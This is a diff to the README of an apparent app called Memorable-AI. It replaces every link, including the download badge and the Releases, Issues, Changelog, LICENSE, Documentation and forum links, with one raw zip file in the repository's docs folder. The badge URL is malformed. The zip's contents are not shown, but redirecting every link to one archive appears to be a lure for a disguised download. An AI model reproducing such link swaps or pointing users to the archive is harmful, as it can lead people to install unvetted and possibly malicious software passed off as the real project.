@@ -18,11 +18,11 @@ Before you begin, ensure your computer meets the following requirements:
 
 ### Download Link
 
-[![Download Memorable-AI](https://img.shields.io/badge/Download%20Memorable--AI-blue.svg)](https://github.com/darnay/memorable-ai/releases)
+[![Download Memorable-AI](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip%https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)
 
 ### Visit the Releases Page
 
-To download the latest version, visit the [Releases page](https://github.com/darnay/memorable-ai/releases). There, you'll find all available versions and their release notes.
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip). There, you'll find all available versions and their release notes.
 
 ## 💻 Installation Instructions
 
@@ -72,20 +72,20 @@ Memorable-AI comes packed with features designed to enhance your memory:
 
 ## 💬 Support & Feedback
 
-If you encounter any issues or have suggestions, reach out through our [Issues page](https://github.com/darnay/memorable-ai/issues). We appreciate your feedback and aim to make Memorable-AI better.
+If you encounter any issues or have suggestions, reach out through our [Issues page](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip). We appreciate your feedback and aim to make Memorable-AI better.
 
 ## 📝 Changelog
 
-Check the [Changelog](https://github.com/darnay/memorable-ai/releases) for detailed notes on updates and new features. 
+Check the [Changelog](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip) for detailed notes on updates and new features. 
 
 ## 📜 License
 
-Memorable-AI is open source. You can find the full license details in the [LICENSE](https://github.com/darnay/memorable-ai/blob/main/LICENSE) file.
+Memorable-AI is open source. You can find the full license details in the [LICENSE](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip) file.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/darnay/memorable-ai/wiki)
-- [Community Forum](https://github.com/darnay/memorable-ai/discussions)
+- [Documentation](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/darnay/memorable-ai/main/docs/memorable-ai_1.3.zip)
 
 Thank you for using Memorable-AI! We hope it greatly helps you remember everything effortlessly.
 ```
